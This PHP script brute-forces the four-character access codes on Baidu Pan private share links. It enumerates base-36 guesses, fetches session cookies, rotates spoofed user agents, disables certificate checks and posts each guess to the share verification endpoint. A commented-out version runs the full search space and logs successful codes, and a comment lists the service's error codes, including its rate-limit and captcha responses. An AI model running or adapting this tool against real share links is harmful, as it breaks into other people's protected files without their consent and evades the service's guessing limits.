<?php

set_time_limit(0);

//$s1 = '1jH4v3oy';
//$s  = substr($s1, 1);
//
//static $cookie = '';
//define('SS', $s);
//touch_file();
//
//$user_agent = get_user_agent();
//$cookie     = get_cookie($s, $user_agent);
//$limit      = pow(36, 4);
//for ($i = 0; $i < $limit; $i ++)
//{
//	$pwd = get_str($i);
//	while (TRUE)
//	{
//		$re = get_page($s, $user_agent, $pwd, $cookie);
//		if ($re !== 1)
//		{
//			break;
//		}
//	}
//}
//
//// 返回值：1：需要重新设置cookie，2：错误，3：正确
//function get_page($s, $user_agent, $pwd, $cookie)
//{
//	loger('pwd:'.$pwd);
//	$data = [
//		'pwd'       => $pwd,
//		'vcode'     => '',
//		'vcode_str' => '',
//	];
//	$data = http_build_query($data);
//	$t    = get_total_millisecond();
//
//	$verify_url = 'https://pan.baidu.com/share/verify?';
//	$verify_url .= 'surl='.$s;
//	$verify_url .= '&t='.$t;
//	$verify_url .= '&bdstoken=null';
//	$verify_url .= '&channel=chunlei';
//	$verify_url .= '&clienttype=0';
//	$verify_url .= '&web=1';
//	$verify_url .= '&app_id=250528';
//	$verify_url .= '&logid=MTUxNDQzMTk1NzA0NjAuNTQzNjA4ODMwNDk3MzIwMw==';
//	$ch         = curl_init($verify_url);
//	curl_setopt($ch, CURLOPT_HTTPHEADER, [
//		'Accept:*/*',
//		'Accept-Encoding:gzip, deflate, br',
//		'Accept-Language:zh-CN,zh;q=0.9',
//		'Cache-Control:no-cache',
//		'Connection:keep-alive',
//		//		'Content-Length:26',
//		'Content-Type:application/x-www-form-urlencoded; charset=UTF-8',
//		'Cookie:'.$cookie,
//		'Host:pan.baidu.com',
//		'Origin:https://pan.baidu.com',
//		'Pragma:no-cache',
//		'Referer:https://pan.baidu.com/share/init?surl='.$s,
//		'User-Agent:'.$user_agent,
//		'X-Requested-With:XMLHttpRequest',
//	]);
//	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
//	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
//	curl_setopt($ch, CURLOPT_POST, TRUE);
//	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
//	curl_setopt($ch, CURLOPT_HEADER, TRUE);
////	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Encoding: gzip, deflate'));
//	curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
//	curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 设置超时限制防止死循环
//	$result = curl_exec($ch);
//
//	// 获得响应结果里的：头大小
//	$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
//	/*// 根据头大小去获取头信息内容
//	$header     = trim(substr($result, 0, $headerSize));
//	$header_arr = explode(PHP_EOL, $header);
//
//	$headers = [];
//	$cookie  = '';
//	foreach ($header_arr as $value)
//	{
//		$value = trim($value);
//		if ($value && strpos($value, ':') !== FALSE)
//		{
//			list($k, $v) = explode(':', $value, 2);
//			$headers[$k] = $v;
//
//			if ($k == 'Set-Cookie')
//			{
//				$cookie .= (empty($cookie) ? '' : ';').$v;
//			}
//		}
//	}*/
//
//	// 获取状态码
//	$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
//	if ($httpCode != '200')
//	{
//		loger('!200');
//
//		return 1;
//	}
//
//	// 相应数据
//	$result = trim(substr($result, $headerSize));
//	curl_close($ch);
//	$result = json_decode(trim($result), TRUE);
//
//	if (is_array($result) && isset($result['errno']) && $result['errno'] == 0)
//	{
//		log('pwd----real---'.$pwd);
//
//		return 3;
//	}
//
//	loger('pwd:'.$pwd.'--over');
//
//	return 2;
//}
//
//function get_cookie($s, $user_agent)
//{
//	$url = 'http://pan.baidu.com/s'.$s;
//	// 根据地址获取百度网盘的真正地址
//	$ch = curl_init($url);
//	curl_setopt($ch, CURLOPT_HTTPHEADER, [
//		'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
//		'Accept-Encoding:gzip, deflate, br',
//		'Accept-Language:zh-CN,zh;q=0.9',
//		'Connection:keep-alive',
//		'Host:pan.baidu.com',
//		'Upgrade-Insecure-Requests:1',
//		'User-Agent:'.$user_agent,
//	]);
//	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
//	// 只获取响应头就行了
//	curl_setopt($ch, CURLOPT_HEADER, TRUE);
//	curl_setopt($ch, CURLOPT_NOBODY, TRUE);
//	curl_setopt($ch, CURLOPT_REFERER, $url);
//	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
//	curl_setopt($ch, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
//	$result = curl_exec($ch);
//	// 获得响应结果里的：头大小
//	$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
//	curl_close($ch);
//	// 根据头大小去获取头信息内容
//	$header     = substr($result, 0, $headerSize);
//	$header_arr = explode(PHP_EOL, $header);
//
//	$headers = [];
//	foreach ($header_arr as $value)
//	{
//		$value = trim($value);
//		if ($value && strpos($value, ':') !== FALSE)
//		{
//			list($k, $v) = explode(':', $value, 2);
//			$headers[$k] = $v;
//		}
//	}
//
//	$cookie_tmp = $headers['Set-Cookie'];
//
//	return $cookie_tmp;
//}
//
//function touch_file()
//{
//	$file = './'.SS.'.txt';
//	if ( ! file_exists($file))
//	{
//		touch($file);
//	}
//	else
//	{
//		file_put_contents($file, '');
//	}
//}
//
//function loger($data)
//{
//	$file = './'.SS.'.txt';
//	$data = json_encode($data);
//	$f    = fopen($file, 'a+');
//	fwrite($f, $data);
//	fwrite($f, PHP_EOL);
//	fclose($f);
//}
//
//die;

$sapi_type = php_sapi_name();
$is_cli    = (substr($sapi_type, 0, 3) == 'cgi') ? FALSE : TRUE;

if ($is_cli)
{
	if ($argc >= 2)
	{
		$s = $argv[1];
	}
}
else
{
	if (isset($_GET['s']))
	{
		$s = $_GET['s'];
	}
}

if (empty($s))
{
	$url = '1jH4v3oy';
}
if (empty($url))
{
	$url = 'http://pan.baidu.com/s/'.$s;
}

$limit = pow(36, 4);
for ($i = 19; $i < 20; $i ++)
{
	$str = get_str($i);
	output($i.'---'.$str);
	$re = get_pan($url, $str);
	if ($re)
	{
		echo $i.':'.$str;
		break;
	}
}
die('script is over. ok!');

function get_str($i)
{
	$n   = base_convert($i, 10, 36);
	$n   = str_pad($n, 4, 0, STR_PAD_LEFT);
	$arr = str_split($n, 1);
	$str = implode('', $arr);

	return $str;
}

function get_pan($url, $pwd = '')
{
	$user_agent = get_user_agent();
	// 根据地址获取百度网盘的真正地址
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'Accept-Encoding:gzip, deflate, br',
		'Accept-Language:zh-CN,zh;q=0.9',
		'Connection:keep-alive',
		'Host:pan.baidu.com',
		'Upgrade-Insecure-Requests:1',
		'User-Agent:'.$user_agent,
	]);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	// 只获取响应头就行了
	curl_setopt($ch, CURLOPT_HEADER, TRUE);
	curl_setopt($ch, CURLOPT_NOBODY, TRUE);
	curl_setopt($ch, CURLOPT_REFERER, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
	$result = curl_exec($ch);
	// 获得响应结果里的：头大小
	$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
	curl_close($ch);
	// 根据头大小去获取头信息内容
	$header     = substr($result, 0, $headerSize);
	$header_arr = explode(PHP_EOL, $header);

	$headers = [];
	foreach ($header_arr as $value)
	{
		$value = trim($value);
		if ($value && strpos($value, ':') !== FALSE)
		{
			list($k, $v) = explode(':', $value, 2);
			$headers[$k] = $v;
		}
	}

	$cookie_tmp = $headers['Set-Cookie'];

	/*if ($headers['Set-Cookie'])
	{
		$cookies = $headers['Set-Cookie'];
		$cookies = explode(';', $cookies);
		$cookie  = [];
		foreach ($cookies as $value)
		{
			$value = trim($value);
			if ($value && strpos($value, '=') !== FALSE)
			{
				list($k, $v) = explode('=', $value, 2);
				setcookie($k, $v);
				$cookie[$k] = $v;
			}
		}
	}*/

	// 以上是设置cookie，一下获取百度网盘的真正地址

	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'Accept-Encoding:gzip, deflate, br',
		'Accept-Language:zh-CN,zh;q=0.9',
		'Connection:keep-alive',
		'Host:pan.baidu.com',
		'Upgrade-Insecure-Requests:1',
		'User-Agent:'.$user_agent,
		'Cookie:'.$cookie_tmp,
	]);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	// 只获取响应头就行了
	curl_setopt($ch, CURLOPT_HEADER, TRUE);
	curl_setopt($ch, CURLOPT_NOBODY, TRUE);
	curl_setopt($ch, CURLOPT_REFERER, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
	$result = curl_exec($ch);
	// 获得响应结果里的：头大小
	$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
	curl_close($ch);
	// 根据头大小去获取头信息内容
	$header     = substr($result, 0, $headerSize);
	$header_arr = explode(PHP_EOL, $header);

	$headers = [];
	foreach ($header_arr as $value)
	{
		$value = trim($value);
		if ($value && strpos($value, ':') !== FALSE)
		{
			list($k, $v) = explode(':', $value, 2);
			$headers[$k] = $v;
		}
	}
	$location  = trim($headers['Location']);
	$info      = parse_url($location);
	$query     = $info['query'];
	$query_arr = explode('&', $query);
	$queries   = [];
	foreach ($query_arr as $item)
	{
		$item = trim($item);
		if ($item && strpos($item, '=') !== FALSE)
		{
			list($k, $v) = explode('=', $item);
			$queries[$k] = $v;
		}
	}
	$surl = $queries['surl'];
	$t    = get_total_millisecond();

	$data = [
		'pwd'       => $pwd,
		'vcode'     => '',
		'vcode_str' => '',
	];
	$data = http_build_query($data);

	$verify_url = 'https://pan.baidu.com/share/verify?';
	$verify_url .= 'surl='.$surl;
	$verify_url .= '&t='.$t;
	$verify_url .= '&bdstoken=null';
	$verify_url .= '&channel=chunlei';
	$verify_url .= '&clienttype=0';
	$verify_url .= '&web=1';
	$verify_url .= '&app_id=250528';
	$verify_url .= '&logid=MTUxNDQzMTk1NzA0NjAuNTQzNjA4ODMwNDk3MzIwMw==';
	$ch         = curl_init($verify_url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Accept:*/*',
		'Accept-Encoding:gzip, deflate, br',
		'Accept-Language:zh-CN,zh;q=0.9',
		'Cache-Control:no-cache',
		'Connection:keep-alive',
		//		'Content-Length:26',
		'Content-Type:application/x-www-form-urlencoded; charset=UTF-8',
		'Cookie:'.$cookie_tmp,
		'Host:pan.baidu.com',
		'Origin:https://pan.baidu.com',
		'Pragma:no-cache',
		'Referer:https://pan.baidu.com/share/init?surl='.$surl,
		'User-Agent:'.$user_agent,
		'X-Requested-With:XMLHttpRequest',
	]);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_REFERER, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	curl_setopt($ch, CURLOPT_POST, TRUE);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
//	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Encoding: gzip, deflate'));
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
	curl_setopt($ch, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
	$result = curl_exec($ch);
	curl_close($ch);
	dump($result);

	$result = json_decode(trim($result), TRUE);

	if (is_array($result) && isset($result['errno']) && $result['errno'] == 0)
	{
		return TRUE;
	}

	return FALSE;
	/*
	 * {"errno":-9,"err_msg":"","request_id":4817706520363686291}        //密码错误
	{"errno":-62,"request_id":206026661042873124}                        //要验证码了
	{"errno":0,"err_msg":"","request_id":4817740255807962253}        //密码正确
		-12 好像是位数不正确

		0:成功;
	-1:由于您分享了违反相关法律法规的文件，分享功能已被禁用，之前分享出去的文件不受影响。;
	-2:用户不存在;请刷新页面后重试;-3:文件不存在;请刷新页面后重试;
	-4:登录信息有误，请重新登录试试;
	-5:登录信息有误，请重新登录试试;
	-6:请重新登录;
	-7:该分享已删除或已取消;
	-8:该分享已经过期;
	-9:访问密码错误;
	-10:分享外链已经达到最大上限100000条，不能再次分享;
	-11:验证cookie无效;
	-14:对不起，短信分享每天限制20条，你今天已经分享完，请明天再来分享吧！;
	-15:对不起，邮件分享每天限制20封，你今天已经分享完，请明天再来分享吧！;
	-16:对不起，该文件已经限制分享！;
	-17:文件分享超过限制;
	-19:验证码输入错误，请重试;
	-20:请求验证码失败，请重试;
	-21:未绑定手机或邮箱，没有权限私密分享;
	-22:被分享的文件无法重命名，移动等操作;
	-30:文件已存在;
	-31:文件保存失败;
	-32:你的空间不足了哟，赶紧购买空间吧;
	-33:一次支持操作999个，减点试试吧;
	-40:热门推荐失败;
	-60:相关推荐数据异常;
	-62:密码输入次数达到上限;
	-64:描述包含敏感词;
	-70:你分享的文件中包含病毒或疑似病毒，为了你和他人的数据安全，换个文件分享吧;
	1:服务器错误;
	2:参数错误;
	3:未登录或帐号无效;
	4:存储好像出问题了，请稍候再试;
	12:批量处理错误;
	14:网络错误，请稍候重试;
	15:操作失败，请稍候重试;
	16:网络错误，请稍候重试;
	105:创建链接失败，请重试;
	106:'文件读取失败，请<ahref=javascript:window.location.reload();>刷新</a>页面后重试';
	108:文件名有敏感词，优化一下吧;
	110:您今天分享太多了，24小时后再试吧;
	111:外链转存失败，请稍候重试;
	112:'页面已过期，请<ahref=javascript:window.location.reload();>刷新</a>后重试';
	113:外链签名有误;
	114:当前任务不存在，保存失败;
	115:该文件禁止分享;
	116:分享不存在;117:分享已经过期;2126:文件名中含有敏感词;
	2135:对方拒绝接收消息;2102:群组不存在;2103:你已退出该群;
	9100:'你的帐号存在违规行为，已被冻结，<ahref=/disk/appeal>查看详情</a>';
	9200:'你的帐号存在违规行为，已被冻结，<ahref=/disk/appeal>查看详情</a>';
	9300:'你的帐号存在违规行为，该功能暂被冻结，<ahref=/disk/appeal>查看详情</a>';
	9400:'你的帐号异常，需验证后才能使用该功能，<ahref=/disk/appeal>立即验证</a>';
	9500:'您的帐号存在安全风险，已进入保护模式，请修改密码后使用;<a
		 */
}

/*
*返回字符串的毫秒数时间戳
*/
function get_total_millisecond()
{
	$time  = explode(" ", microtime());
	$time  = $time [1].($time [0] * 1000);
	$time2 = explode(".", $time);
	$time  = $time2[0];

	return $time;
}

/*
 * 获取随机的user-agent
 */
function get_user_agent()
{
	$user_agent = array(
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
		"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) App leWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
		"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
		"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
		"Opera/9.25 (Windows NT 5.1; U; en)",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
		"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
		"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
		"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.12) Gecko/20070731 Ubuntu/dapper-security Firefox/1.5.0.12",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
	);

	return $user_agent[array_rand($user_agent)];
}

/**
 * 浏览器友好的变量输出
 *
 * @param mixed   $var    变量
 * @param boolean $echo   是否输出 默认为True 如果为false 则返回输出字符串
 * @param string  $label  标签 默认为空
 * @param boolean $strict 是否严谨 默认为true
 *
 * @return void|string
 */
function dump($var, $echo = TRUE, $label = NULL, $strict = TRUE)
{
	$label = ($label === NULL) ? '' : rtrim($label).' ';
	if ( ! $strict)
	{
		if (ini_get('html_errors'))
		{
			$output = print_r($var, TRUE);
			$output = '<pre>'.$label.htmlspecialchars($output, ENT_QUOTES).'</pre>';
		}
		else
		{
			$output = $label.print_r($var, TRUE);
		}
	}
	else
	{
		ob_start();
		var_dump($var);
		$output = ob_get_clean();
		if ( ! extension_loaded('xdebug'))
		{
			$output = preg_replace('/\]\=\>\n(\s+)/m', '] => ', $output);
			$output = '<pre>'.$label.htmlspecialchars($output, ENT_QUOTES).'</pre>';
		}
	}
	if ($echo)
	{
		echo($output);

		return NULL;
	}
	else
	{
		return $output;
	}
}

function output($string)
{
	if (is_array($string))
	{
		var_export($string);
	}
	else
	{
		echo $string;
	}
	echo "\n";
	ob_flush();
	flush();
}

